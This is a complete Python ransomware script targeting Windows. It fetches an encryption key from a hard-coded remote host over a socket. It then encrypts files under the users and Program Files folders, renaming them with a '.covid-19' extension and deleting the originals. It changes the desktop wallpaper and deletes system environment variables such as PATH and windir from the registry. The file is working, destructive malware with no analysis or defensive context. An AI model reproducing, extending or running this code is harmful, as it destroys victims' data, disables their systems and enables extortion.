#!/usr/bin/python
#coding:utf-8
from cryptography.fernet import Fernet
import os, sys, socket, wget, struct, ctypes, shutil, time, winreg

#START THE SOCKET SERVER
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.1.16", 8000))
enter = "[!] Transfert the key and the password :\n "
exit = "\n[!] Transfert [OK]"
sock.send(enter.encode())
print(sock.recv(2048).decode())
key = sock.recv(2048)
print(key)
sock.send(exit.encode())
sock.close()

#FILE ENCYPTING FUNCTION
def file_ecrypt(key, name):
    if (name!="Ransomware.py"):
        with open(name,'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        encrypted_file = name + ".covid-19"
        try:
            with open(encrypted_file, 'wb') as f:
                f.write(encrypted)

            os.remove(name)
        except:
            print("Error: Not Permitted")

path = os.getcwd()
img = "\setup\image.jpg"
Wallpaper = "%s%s" %(path, img)
filePath = shutil.copy(Wallpaper, 'c:\\PerfLogs\\image.jpg')
# WALLPAPER SETTINGS
SPI_SETDESKWALLPAPER = 20
WALLPAPER_PATH = 'c:\\PerfLogs\\image.jpg'

def is_64_windows():
    """Find out how many bits is OS. """
    return struct.calcsize('P') * 8 == 64

def get_sys_parameters_info():
    """Based on if this is 32bit or 64bit returns correct version of SystemParametersInfo function. """
    return ctypes.windll.user32.SystemParametersInfoW if is_64_windows() \
        else ctypes.windll.user32.SystemParametersInfoA

def change_wallpaper():
    sys_parameters_info = get_sys_parameters_info()
    r = sys_parameters_info(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH, 3)
    if not r:
        print(ctypes.WinError())
#LIST ALL FILES FOR PARTICULAR FILE EXTENTIONS AND INVOKE FILE ENCTYPT FUNCTION.
def filelist():
    mylist = ["contact",".mpeg",".wma",".txt",".pdf","png","jpg","docx","doc","xls","ppt","pptx","rar","zip",".mp3",".wmv",".mp4","dll","exe","bmp",".rtf"]
    spec = "c:/users/"
    for root, dirs, files in os.walk(spec):
        for file in files:
            for ext in mylist:
                if file.endswith(ext):
                    ally = os.path.join(root, file)
                    print(ally)
                    file_ecrypt(key, ally)
    spec2 = "c:/Program Files (x86)/"
    for root, dirs, files in os.walk(spec2):
        for file in files:
            for ext in mylist:
                if file.endswith(ext):
                    ally = os.path.join(root, file)
                    print(ally)
                    file_ecrypt(key, ally)
filelist()
time.sleep(2)
change_wallpaper()
# ENCRYPT THE FOLDER CONTAINS THE WALLPAPER
def filelist_aux():
    mylist = ["jpg","png","log"]
    spec = "c:/PerfLogs/"
    for root, dirs, files in os.walk(spec):
        for file in files:
            for ext in mylist:
                if file.endswith(ext):
                    ally = os.path.join(root, file)
                    print(ally)
                    file_ecrypt(key, ally)
filelist_aux()
# FUNCTION TO DELETE A SPECIAL REG ENVIRONMENT IN THE REGISTER
def delSpecRules():
    regs = ['TEMP', 'USERNAME', 'windir', 'OS', 'PATHEXT', 'PATH', 'PSModulePath']
    for reg in regs:
        cmd = 'c:/windows/system32/reg.exe delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v %s /f' %(reg)
        os.system(cmd)
        time.sleep(2)
delSpecRules()
# FUNCTION TO DELETE A REG ENVIRONMENT IN THE REGISTER
def delRules():
    aKey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment",0, winreg.KEY_ALL_ACCESS)
    for keys in range(0, 1024):
        try:
            keyname = winreg.EnumValue(aKey, keys)
            key, value, id = (keyname)
            cmd = 'c:/windows/system32/reg.exe delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v %s /f' %(key)
            os.system(cmd)
            time.sleep(2)
        except OSError:
            pass
delRules()
